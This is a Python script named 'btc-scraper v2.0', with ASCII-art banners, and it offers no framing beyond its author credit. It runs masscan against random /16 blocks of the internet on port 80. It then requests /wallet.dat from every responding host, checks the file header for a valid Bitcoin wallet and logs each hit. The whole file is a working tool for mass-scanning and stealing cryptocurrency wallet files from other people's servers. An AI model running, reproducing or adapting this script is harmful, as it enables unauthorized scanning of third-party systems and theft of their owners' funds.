#  @@@@@@@   @@@@@@@   @@@@@@@              @@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   @@@@@@@@  @@@@@@@   
#  @@@@@@@@  @@@@@@@  @@@@@@@@             @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
#  @@!  @@@    @@!    !@@                  !@@       !@@       @@!  @@@  @@!  @@@  @@!  @@@  @@!       @@!  @@@  
#  !@   @!@    !@!    !@!                  !@!       !@!       !@!  @!@  !@!  @!@  !@!  @!@  !@!       !@!  @!@  
#  @!@!@!@     @!!    !@!       @!@!@!@!@  !!@@!!    !@!       @!@!!@!   @!@!@!@!  @!@@!@!   @!!!:!    @!@!!@!  
#  !!!@!!!!    !!!    !!!       !!!@!@!!!   !!@!!!   !!!       !!@!@!    !!!@!!!!  !!@!!!    !!!!!:    !!@!@!    
#  !!:  !!!    !!:    :!!                       !:!  :!!       !!: :!!   !!:  !!!  !!:       !!:       !!: :!!   
#  :!:  !:!    :!:    :!:                      !:!   :!:       :!:  !:!  :!:  !:!  :!:       :!:       :!:  !:!  
#   :: ::::     ::     ::: :::             :::: ::    ::: :::  ::   :::  ::   :::   ::        :: ::::  ::   :::  
#  :: : ::      :      :: :: :             :: : :     :: :: :   :   : :   :   : :   :        : :: ::    :   : :  
# btc-scraper v2.0 made by http://twitter.com/notc0n

import subprocess
import sys
import requests
import traceback
import logging
import time
from termcolor import colored
import random

def fetchwallet(url):
	try:
		r = requests.get(url)
	except:
		return False
	
	c = r.content
	i = 0
	fileheader = ''

	for b in c:
		i = i + 1
		if (i > 14):
			break

		fileheader = fileheader + ' ' + hex(b)
		#print(hex(b))

	#print(fileheader[1:])

	if r.status_code == 404:
		print(colored('[FAIL] no wallet.dat found at ' + url, 'red'))
		return False

	if (fileheader[1:] == '0x0 0x0 0x0 0x0 0x1 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x62 0x31'):
		print(colored('[SUCCESS] valid wallet.dat found at ' + url, 'green'))

		#f = open('btc-scraper.log', 'wb')
		#f.write('[SUCCESS] valid wallet.dat found at ' + url + '\n')
		#f.close()

		return True

	else:
		print(colored('[FAIL] not a valid wallet.dat file at ' + url, 'red'))
		return False

print(colored('@@@@@@@   @@@@@@@   @@@@@@@              @@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   @@@@@@@@  @@@@@@@   ', 'blue'))
print(colored('@@@@@@@@  @@@@@@@  @@@@@@@@             @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  ', 'blue'))
print(colored('@@!  @@@    @@!    !@@                  !@@       !@@       @@!  @@@  @@!  @@@  @@!  @@@  @@!       @@!  @@@  ', 'blue'))
print(colored('!@   @!@    !@!    !@!                  !@!       !@!       !@!  @!@  !@!  @!@  !@!  @!@  !@!       !@!  @!@  ', 'blue'))
print(colored(' @!@!@!@     @!!    !@!       @!@!@!@!@  !!@@!!    !@!       @!@!!@!   @!@!@!@!  @!@@!@!   @!!!:!    @!@!!@!  ', 'blue'))
print(colored('!!!@!!!!    !!!    !!!       !!!@!@!!!   !!@!!!   !!!       !!@!@!    !!!@!!!!  !!@!!!    !!!!!:    !!@!@!    ', 'blue'))
print(colored('!!:  !!!    !!:    :!!                       !:!  :!!       !!: :!!   !!:  !!!  !!:       !!:       !!: :!!   ', 'blue'))
print(colored(':!:  !:!    :!:    :!:                      !:!   :!:       :!:  !:!  :!:  !:!  :!:       :!:       :!:  !:!  ', 'blue'))
print(colored(' :: ::::     ::     ::: :::             :::: ::    ::: :::  ::   :::  ::   :::   ::        :: ::::  ::   :::  ', 'blue'))
print(colored(':: : ::      :      :: :: :             :: : :     :: :: :   :   : :   :   : :   :        : :: ::    :   : :  ', 'blue'))
print(colored('btc-scraper v2.0 made by http://twitter.com/notc0n', 'blue'))
#172.217.0.0/16
process = subprocess.Popen('/usr/bin/masscan ' + str(random.randint(0,254)) + '.' + str(random.randint(0,254)) + '.0.0/16 -p 80 --randomize-hosts --exclude 255.255.255.255', shell=True , stdout=subprocess.PIPE)
for line in process.stdout:
	try:
		line = line.decode("utf-8")
		ip = line.split(' ')[5]
		url = 'http://' + ip + '/wallet.dat'

		print(colored('[INFO] Trying ' + url + '...', 'yellow'))

		file_object = open('btc-scraper.log', 'a')
		file_object.write('Trying... ' + url + '\n')
		file_object.close()
		#time.sleep(0.5)

		if (fetchwallet(url)):
			file_object = open('btc-scraper.log', 'a')
			file_object.write('[SUCCESS] valid wallet.dat found at ' + url + '\n')
			file_object.close()

	except Exception as e:
		logging.error(traceback.format_exc())

		break